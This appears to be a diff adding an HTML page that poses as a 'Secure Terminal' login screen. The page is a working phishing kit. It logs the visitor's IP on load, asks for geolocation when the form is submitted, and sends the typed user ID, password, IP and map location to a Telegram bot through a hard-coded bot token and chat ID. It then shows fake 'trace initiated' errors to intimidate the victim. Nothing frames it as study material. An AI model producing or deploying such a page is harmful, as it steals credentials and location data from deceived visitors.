@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Terminal | Access Restricted</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 10px; }
+        .terminal { width: 100%; max-width: 600px; background: #0a0a0a; padding: 25px; border-radius: 8px; border: 1px solid #0f0; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); }
+        .header { border-bottom: 1px solid #222; padding-bottom: 10px; margin-bottom: 20px; color: #555; font-size: 0.8rem; }
+        .prompt { color: #58a6ff; }
+        .output { color: #c9d1d9; }
+        .login-section { margin-top: 30px; padding: 15px; border: 1px dashed #333; background: #050505; }
+        input { background: transparent; border: 1px solid #222; color: #0f0; padding: 12px; margin: 10px 0; width: 90%; outline: none; }
+        button { background: #0f0; color: #000; border: none; padding: 12px; width: 95%; cursor: pointer; font-weight: bold; margin-top: 5px; }
+        button:hover { background: #0c0; }
+        .cursor { display: inline-block; width: 8px; height: 15px; background: #0f0; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body onload="captureIP()">
+
+    <div class="terminal">
+        <div class="header">NODE_V4.2_SYSTEM [PROTECTED MODE]</div>
+        <div class="content">
+            <p><span class="prompt">guest@remote_srv:~$</span> whoami</p>
+            <p class="output">> <strong>Alias:</strong> sys_check_log</p>
+            <p class="output">> <strong>Role:</strong> Security Analyst</p>
+            <p class="output">> <strong>Location:</strong> London, UK</p> 
+            <p><span class="prompt">guest@remote_srv:~$</span> status --network</p>
+            <p class="output">> Connection: Encrypted</p>
+            <p id="ip-display" class="output">> Identifying IP...</p>
+
+            <div class="login-section">
+                <p style="color: #ffbd2e; margin: 0;">[ SYSTEM AUTHENTICATION ]</p>
+                <input type="text" id="u_name" placeholder="User ID">
+                <input type="password" id="p_word" placeholder="Access Key">
+                <button onclick="checkAccess()">RUN ACCESS COMMAND</button>
+            </div>
+            <p style="margin-top:15px;"><span class="cursor"></span></p>
+        </div>
+    </div>
+
+    <script>
+        let userIP = "Unknown";
+        
+        // Your Integrated Telegram Credentials
+        const botToken = '8647206818:AAFZLOumQpIBYD3WuDceeOGWkNDCLViGzZI'; 
+        const chatId = '7008952746';     
+
+        async function captureIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                document.getElementById('ip-display').innerHTML = "> IP Logged: " + userIP;
+            } catch (err) {
+                document.getElementById('ip-display').innerHTML = "> IP Logged: Secured";
+            }
+        }
+
+        function checkAccess() {
+            let u = document.getElementById('u_name').value;
+            let p = document.getElementById('p_word').value;
+            if(u === "" || p === "") { alert("Authentication Required."); return; }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    await sendToTelegram(u, p, userIP, lat, lon);
+                    alert("CRITICAL ERROR: Access denied. Remote trace initiated for security.");
+                }, async function(error) {
+                    await sendToTelegram(u, p, userIP, "Denied", "Denied");
+                    alert("ERROR 403: Forbidden access. Credentials logged.");
+                });
+            } else {
+                sendToTelegram(u, p, userIP, "N/A", "N/A");
+                alert("System Error: Terminal outdated.");
+            }
+        }
+
+        async function sendToTelegram(u, p, ip, lat, lon) {
+            let mapLink = (lat !== "Denied" && lat !== "N/A") ? `https://www.google.com/maps?q=${lat},${lon}` : "Not Available";
+            let message = `⚠️ *New Credentials Captured!* ⚠️\n\n👤 *User:* ${u}\n🔑 *Pass:* ${p}\n🌐 *IP:* ${ip}\n📍 *Location:* ${mapLink}`;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+        }
+    </script>
+</body>
+</html>
